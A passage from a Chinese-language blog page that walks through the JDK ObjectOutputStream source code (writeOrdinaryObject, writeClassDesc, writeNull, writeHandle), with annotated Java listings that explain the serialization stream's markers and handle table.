回指到它）。</span></span><br><span class="line">    <span class="comment">// 为 false 时，登记该字符串实例，使后续重复出现时可以写 TC_REFERENCE 节省体积。</span></span><br><span class="line">    handles.assign(unshared ? <span class="literal">null</span> : str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预先计算按 MUTF-8 编码后的字节长度（可能大于 str.length()），返回 long 以避免长度溢出。</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">utflen</span> <span class="operator">=</span> bout.getUTFLength(str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据长度选择写入格式：</span></span><br><span class="line">    <span class="comment">// - &lt;= 0xFFFF： TC_STRING（0x74） + 2 字节长度 + UTF 数据</span></span><br><span class="line">    <span class="comment">// -  &gt; 0xFFFF： TC_LONGSTRING（0x7C） + 8 字节长度 + UTF 数据</span></span><br><span class="line">    <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        bout.writeByte(TC_STRING);</span><br><span class="line">        <span class="comment">// writeUTF 会写入 2 字节长度（与 utflen 匹配）+ 实际 UTF 字节</span></span><br><span class="line">        bout.writeUTF(str, utflen);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bout.writeByte(TC_LONGSTRING);</span><br><span class="line">        <span class="comment">// writeLongUTF 会写入 8 字节长度 + 实际 UTF 字节</span></span><br><span class="line">        bout.writeLongUTF(str, utflen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="writeOrdinaryObject"><a href="#writeOrdinaryObject" class="headerlink" title="writeOrdinaryObject"></a>writeOrdinaryObject</h4><p>现在我们重点来看看 <code>writeOrdinaryObject</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写出一个“普通的”可序列化对象到流中。</span></span><br><span class="line"><span class="comment"> * “普通”是相对以下几类而言：它既不是 String、也不是 Class、也不是</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass、也不是数组（array）、也不是枚举常量（enum）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 线上二进制大致结构（概念示意）：</span></span><br><span class="line"><span class="comment"> *   TC_OBJECT</span></span><br><span class="line"><span class="comment"> *   &lt;classDesc 或其 TC_REFERENCE&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;instanceData&gt;  // 由 writeSerialData 或 writeExternalData 负责</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 对象头使用结构化标记 TC_OBJECT（0x73）。</span></span><br><span class="line"><span class="comment"> * - “类描述”（classDesc）可能是：</span></span><br><span class="line"><span class="comment"> *      * 首次出现：完整的 TC_CLASSDESC / TC_PROXYCLASSDESC；</span></span><br><span class="line"><span class="comment"> *      * 已出现过：通过 TC_REFERENCE 回引到之前的类描述。</span></span><br><span class="line"><span class="comment"> * - 实例数据写出路径：</span></span><br><span class="line"><span class="comment"> *      * Externalizable 且非代理类(proxy)：走 writeExternalData（对象自定义 writeExternal）。</span></span><br><span class="line"><span class="comment"> *      * 否则：走 writeSerialData（默认/自定义 writeObject、默认字段等）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeOrdinaryObject</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                                 ObjectStreamClass desc,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// （可选）为调试增强：把“当前正在写出的对象”压入调试栈，便于异常时展示写入路径。</span></span><br><span class="line">    <span class="comment">// depth == 1 表示本次 writeObject0 的“根对象”，加上 &quot;root &quot; 标签更易读。</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(</span><br><span class="line">            (depth == <span class="number">1</span> ? <span class="string">&quot;root &quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="string">&quot;object (class \&quot;&quot;</span> +</span><br><span class="line">            obj.getClass().getName() + <span class="string">&quot;\&quot;, &quot;</span> + obj.toString() + <span class="string">&quot;)&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 序列化前置校验：</span></span><br><span class="line">        <span class="comment">//    - 检查该类是否满足被序列化的先决条件（实现 Serializable / Externalizable 等）。</span></span><br><span class="line">        <span class="comment">//    - 对 Externalizable 类，还会检查无参 public 构造器等要求。</span></span><br><span class="line">        <span class="comment">//    - 不满足时抛出 NotSerializableException。</span></span><br><span class="line">        desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 写对象头标记：TC_OBJECT（结构化标记，必须在“非块模式”下写出）。</span></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 写“类描述符”（class descriptor）：</span></span><br><span class="line">        <span class="comment">//    - 可能写入完整的描述（TC_CLASSDESC/TC_PROXYCLASSDESC），包含 SUID、字段签名等；</span></span><br><span class="line">        <span class="comment">//    - 也可能写一个对前述描述的句柄引用（TC_REFERENCE），若该类描述已写过。</span></span><br><span class="line">        <span class="comment">//    - 这里第二个参数传 false：类描述本身始终按“可共享”语义处理（允许后续引用）。</span></span><br><span class="line">        writeClassDesc(desc, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 为当前“实例对象”分配句柄（handle）以支持后续的共享/回引：</span></span><br><span class="line">        <span class="comment">//    - unshared == true：传入 null，表示本对象不登记到句柄表（后续不能 TC_REFERENCE 到它），</span></span><br><span class="line">        <span class="comment">//      但实现会维持协议上的句柄计数一致性（readUnshared 语义依赖该一致性）。</span></span><br><span class="line">        <span class="comment">//    - unshared == false：登记该对象，使得对象图中的别名关系可通过 TC_REFERENCE 保持。</span></span><br><span class="line">        handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 根据类型特性选择写实例数据的路径：</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            <span class="comment">// 5.a Externalizable（且不是动态代理类）：</span></span><br><span class="line">            <span class="comment">//     - 直接调用对象的 writeExternal(ObjectOutput) 把“自定义二进制”写出去。</span></span><br><span class="line">            <span class="comment">//     - 在默认协议版本（PROTOCOL_VERSION_2）下，会用 BLOCKDATA（TC_BLOCKDATA/TC_BLOCKDATALONG）</span></span><br><span class="line">            <span class="comment">//       进行包裹，确保接收端能一次性读取到该 external 内容块；</span></span><br><span class="line">            <span class="comment">//     - 若显式使用旧协议版本（useProtocolVersion(PROTOCOL_VERSION_1)），</span></span><br><span class="line">            <span class="comment">//       则按旧格式（可能无需块包裹）写出。</span></span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 5.b 常规 Serializable 对象：</span></span><br><span class="line">            <span class="comment">//     - 写出实例数据（包含父类层级上非 transient/非 static 的字段）；</span></span><br><span class="line">            <span class="comment">//     - 若类自定义了 writeObject/readObject，会在此触发；</span></span><br><span class="line">            <span class="comment">//     - 写字段值时通常会切换到“块数据模式”，以 TC_BLOCKDATA* 包裹原始字段写入，</span></span><br><span class="line">            <span class="comment">//       从而减少标记开销并保持读写对齐。</span></span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 6) 异常与收尾：弹出调试栈，保持调试轨迹对称。</span></span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在写入 obj 对象之前，代码会先调用 <code>checkSerialize()</code> 检查当前对象是否是一个可序列化对象，如果不是那么会终止本次序列化并抛出 <code>newInvalidClassException()</code> 错误：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查“该类的实例”是否**允许被序列化**；若不允许，则抛出 InvalidClassException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 设计要点：</span></span><br><span class="line"><span class="comment"> * 1) ObjectStreamClass（类描述符，简称 OSC）在构建/初始化阶段，会对目标类做一系列校验，</span></span><br><span class="line"><span class="comment"> *    如果发现**不满足序列化前置条件**或**默认序列化存在结构性问题**，就把原因封装进</span></span><br><span class="line"><span class="comment"> *    `serializeEx`（ExceptionInfo）里。</span></span><br><span class="line"><span class="comment"> * 2) 本方法在真正写对象数据前被调用：若此前已记录“不能序列化”的原因，就转化并抛出</span></span><br><span class="line"><span class="comment"> *    InvalidClassException（其中包含类名与详细原因）。</span></span><br><span class="line"><span class="comment"> * 3) 注意：该检查**不适用于枚举常量**的写出（enum 走专门的分支处理）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型会设置 `serializeEx` 的情形（不同 JDK 版本细节略有差异）举例：</span></span><br><span class="line"><span class="comment"> * - 声明的可持久化字段元信息非法：例如 `serialPersistentFields`/字段排列不合法，</span></span><br><span class="line"><span class="comment"> *   `computeFieldOffsets()` 在构建字段布局时抛出 InvalidClassException；此时初始化逻辑会</span></span><br><span class="line"><span class="comment"> *   将异常原因记录到 `serializeEx`（常见源码写法：`serializeEx = new ExceptionInfo(...);`）。 </span></span><br><span class="line"><span class="comment"> * - 其他类层面约束不满足（如某些平台/版本下对 Externalizable/record/value class 的限制等），</span></span><br><span class="line"><span class="comment"> *   也会在初始化阶段把原因放入 `serializeEx`，从而触发这里的抛出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 先决条件：</span></span><br><span class="line"><span class="comment"> * - 必须确保本描述符已完成初始化；否则视为内部使用异常（请见下方 `requireInitialized()`）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException 若该类的对象不允许被序列化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">checkSerialize</span><span class="params">()</span> <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">    <span class="comment">// 防御式：若描述符尚未完成初始化，属于协议/实现时序问题（内部错误）</span></span><br><span class="line">    requireInitialized();</span><br><span class="line">    <span class="comment">// 若初始化阶段已记录“不能序列化”的原因，这里将其抛出为 InvalidClassException</span></span><br><span class="line">    <span class="keyword">if</span> (serializeEx != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> serializeEx.newInvalidClassException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 断言当前 ObjectStreamClass **已完成初始化**；否则抛出 InternalError。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 作用：</span></span><br><span class="line"><span class="comment"> * - OSC 的很多行为依赖于“初始化阶段”收集到的元信息（可否序列化/字段布局/构造器/钩子等）。</span></span><br><span class="line"><span class="comment"> *   若在初始化未完成时就调用某些方法，说明上层用法或流状态有问题，需要立即失败。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型触发途径：</span></span><br><span class="line"><span class="comment"> * - 协议读取/构建描述符尚未完结就提前使用；</span></span><br><span class="line"><span class="comment"> * - 本地通过 `lookup(...)` 等路径拿到的描述符还未完成内部校验/装配。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 异常类型：</span></span><br><span class="line"><span class="comment"> * - 这里抛的是 `InternalError`（运行时错误），属于实现不变量被破坏的信号；</span></span><br><span class="line"><span class="comment"> *   与“业务/协议错误”的 `InvalidClassException` 有所区分。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">requireInitialized</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!initialized)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>(<span class="string">&quot;Unexpected call when not initialized&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果是一个可序列化对象，那么会开始写入 <code>TC_OBJECT</code> 标记（表示开始）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2) 写对象头标记：TC_OBJECT（结构化标记，必须在“非块模式”下写出）。</span></span><br><span class="line">bout.writeByte(TC_OBJECT);</span><br></pre></td></tr></table></figure></div>

<p>随后调用 <code>writeClassDesc</code> 方法写入当前对象所属类的类描述信息：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3) 写“类描述符”（class descriptor）：</span></span><br><span class="line"><span class="comment">//    - 可能写入完整的描述（TC_CLASSDESC/TC_PROXYCLASSDESC），包含 SUID、字段签名等；</span></span><br><span class="line"><span class="comment">//    - 也可能写一个对前述描述的句柄引用（TC_REFERENCE），若该类描述已写过。</span></span><br><span class="line"><span class="comment">//    - 这里第二个参数传 false：类描述本身始终按“可共享”语义处理（允许后续引用）。</span></span><br><span class="line">writeClassDesc(desc, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果使用的模式是 <code>unshared</code> 模式，则将 <code>desc</code> 所表示的类元数据信息插入到 <code>handles</code> 对象的映射表中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4) 为当前“实例对象”分配句柄（handle）以支持后续的共享/回引：</span></span><br><span class="line"><span class="comment">//    - unshared == true：传入 null，表示本对象不登记到句柄表（后续不能 TC_REFERENCE 到它），</span></span><br><span class="line"><span class="comment">//      但实现会维持协议上的句柄计数一致性（readUnshared 语义依赖该一致性）。</span></span><br><span class="line"><span class="comment">//    - unshared == false：登记该对象，使得对象图中的别名关系可通过 TC_REFERENCE 保持。</span></span><br><span class="line">handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br></pre></td></tr></table></figure></div>

<p>最后会判断当前 Java 对象的序列化语义：</p>
<ul>
<li>如果当前对象不是一个<strong>动态代理类</strong>并且是实现了<strong>外部化</strong>的，则调用 <code>writeExternalData</code> 方法写入对象信息；</li>
<li>如果当前对象是一个实现了 <code>Serializable</code> 接口的，则调用 <code>writeSerialData</code> 方法写入对象信息。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5) 根据类型特性选择写实例数据的路径：</span></span><br><span class="line"><span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">    <span class="comment">// 5.a Externalizable（且不是动态代理类）：</span></span><br><span class="line">    <span class="comment">//     - 直接调用对象的 writeExternal(ObjectOutput) 把“自定义二进制”写出去。</span></span><br><span class="line">    <span class="comment">//     - 在默认协议版本（PROTOCOL_VERSION_2）下，会用 BLOCKDATA（TC_BLOCKDATA/TC_BLOCKDATALONG）</span></span><br><span class="line">    <span class="comment">//       进行包裹，确保接收端能一次性读取到该 external 内容块；</span></span><br><span class="line">    <span class="comment">//     - 若显式使用旧协议版本（useProtocolVersion(PROTOCOL_VERSION_1)），</span></span><br><span class="line">    <span class="comment">//       则按旧格式（可能无需块包裹）写出。</span></span><br><span class="line">    writeExternalData((Externalizable) obj);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 5.b 常规 Serializable 对象：</span></span><br><span class="line">    <span class="comment">//     - 写出实例数据（包含父类层级上非 transient/非 static 的字段）；</span></span><br><span class="line">    <span class="comment">//     - 若类自定义了 writeObject/readObject，会在此触发；</span></span><br><span class="line">    <span class="comment">//     - 写字段值时通常会切换到“块数据模式”，以 TC_BLOCKDATA* 包裹原始字段写入，</span></span><br><span class="line">    <span class="comment">//       从而减少标记开销并保持读写对齐。</span></span><br><span class="line">    writeSerialData(obj, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="writeClassDesc"><a href="#writeClassDesc" class="headerlink" title="writeClassDesc"></a>writeClassDesc</h4><p><code>writeClassDesc</code> 方法主要用于判断当前的类描述符使用什么方式写入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“类描述符”（ObjectStreamClass，简称 OSC）的表示写入到序列化流中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 类描述符用于告诉对端：这个类如何被序列化/反序列化（类名、SUID、标志位、字段列表、</span></span><br><span class="line"><span class="comment"> * 是否有 writeObject/readObject、是否 Externalizable、父类描述符等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议相关（写入时会使用到的结构化标记，供理解）：</span></span><br><span class="line"><span class="comment"> * - TC_NULL(0x70)            ：空引用</span></span><br><span class="line"><span class="comment"> * - TC_REFERENCE(0x71)       ：句柄回引（后随 4 字节句柄 ID）</span></span><br><span class="line"><span class="comment"> * - TC_CLASSDESC(0x72)       ：“非代理类”的类描述符</span></span><br><span class="line"><span class="comment"> * - TC_PROXYCLASSDESC(0x7D)  ：“动态代理类（java.lang.reflect.Proxy）”的类描述符</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关于 unshared：</span></span><br><span class="line"><span class="comment"> * - 当作为“独立对象”写出 ObjectStreamClass 本身时，可能会传入 true（走 writeUnshared 语义）。</span></span><br><span class="line"><span class="comment"> * - 当作为“某对象的类描述”被写出时，调用点一般传 false（类描述应可被共享/回引，以避免重复写入）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeClassDesc</span><span class="params">(ObjectStreamClass desc, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 情况 A：没有类描述符（空）→ 写 TC_NULL</span></span><br><span class="line">        writeNull();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 情况 B：允许共享，且该 OSC 之前已经写出过</span></span><br><span class="line">        <span class="comment">//       → 使用句柄回引：写 TC_REFERENCE + 4 字节句柄 ID，避免重复完整输出</span></span><br><span class="line">        writeHandle(handle);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (desc.isProxy()) &#123;</span><br><span class="line">        <span class="comment">// 情况 C：该类是“动态代理类”（由 Proxy 生成）</span></span><br><span class="line">        <span class="comment">//       → 写入代理类描述符（TC_PROXYCLASSDESC），内部会写接口名列表、注解等信息，</span></span><br><span class="line">        <span class="comment">//         并在末尾跟随其父类描述符（通常是 Object）的处理</span></span><br><span class="line">        writeProxyDesc(desc, unshared);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 情况 D：普通（非代理）类</span></span><br><span class="line">        <span class="comment">//       → 写入非代理类描述符（TC_CLASSDESC），包含：</span></span><br><span class="line">        <span class="comment">//         * 类名、serialVersionUID</span></span><br><span class="line">        <span class="comment">//         * 类标志（如 SC_SERIALIZABLE、SC_EXTERNALIZABLE、SC_WRITE_METHOD 等）</span></span><br><span class="line">        <span class="comment">//         * 字段描述数组（类型签名、字段名）</span></span><br><span class="line">        <span class="comment">//         * 若有自定义 writeObject/readObject 将以标志体现</span></span><br><span class="line">        <span class="comment">//         * “注解块”（以块数据写的自定义元数据，通常为空）</span></span><br><span class="line">        <span class="comment">//         * 父类的类描述符（递归同样的规则）</span></span><br><span class="line">        writeNonProxyDesc(desc, unshared);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>如果传入的类描述信息是一个 <code>null</code> 引用，那么会调用 <code>writeNull</code> 方法；</li>
<li>如果没有使用 <code>unshared</code> 方式，并且可以在 <code>handles</code> 对象池中找到传入的对象信息，那么调用<code>writeHandle</code>；</li>
<li>如果传入的类是一个动态代理类，那么调用 <code>writeProxyDesc</code> 方法；</li>
<li>如果上面三个条件都不满足，那么调用 <code>writeNonProxyDesc</code> 方法。</li>
</ul>
<p><code>writeNull</code> 就是向序列化流中写入一个“空引用”标记。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向序列化流写入“空引用”标记。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议语义：</span></span><br><span class="line"><span class="comment"> * - 使用结构化标记 TC_NULL (0x70) 表示一个对象位置上出现了 null。</span></span><br><span class="line"><span class="comment"> * - 常见出现位置：对象引用字段为 null、类描述符的父类为 null（到达 java.lang.Object）等。</span></span><br><span class="line"><span class="comment"> * - 这是“结构化标记”，通常在**非块数据模式**下写出（调用点会负责切换）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I/O 细节：</span></span><br><span class="line"><span class="comment"> * - 通过 DataOutput 写单字节，按 Java 序列化协议的有序字节流输出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeNull</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeByte(TC_NULL); <span class="comment">// 0x70</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeHandle</code> 则是在当前对象允许引用的时候，写入该对象在本地句柄表（<code>handles</code>）的下标信息。</p>
<p>具体来说是写入结构化标记 <code>TC_REFERENCE</code> (0x71) 后跟 4 字节网络句柄 ID。这里网络句柄 ID 对应本地句柄表（<code>handles</code>）的下标。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写出一个“对象句柄引用”（reference），即指向**此前已写出对象**的回引。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议语义：</span></span><br><span class="line"><span class="comment"> * - 结构化标记 TC_REFERENCE (0x71) 后跟 4 字节的“wire handle id”（网络句柄 ID）。</span></span><br><span class="line"><span class="comment"> * - 该 ID = baseWireHandle + handle，其中：</span></span><br><span class="line"><span class="comment"> *     * handle：本地句柄表（handles）的下标，范围从 0 递增；</span></span><br><span class="line"><span class="comment"> *     * baseWireHandle：协议常量，固定为 0x7E0000（参见 ObjectStreamConstants）。</span></span><br><span class="line"><span class="comment"> *   因此，第一次登记的对象在“线上”的句柄是 0x7E0000，第二个是 0x7E0001，如此类推。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这么设计的原因：</span></span><br><span 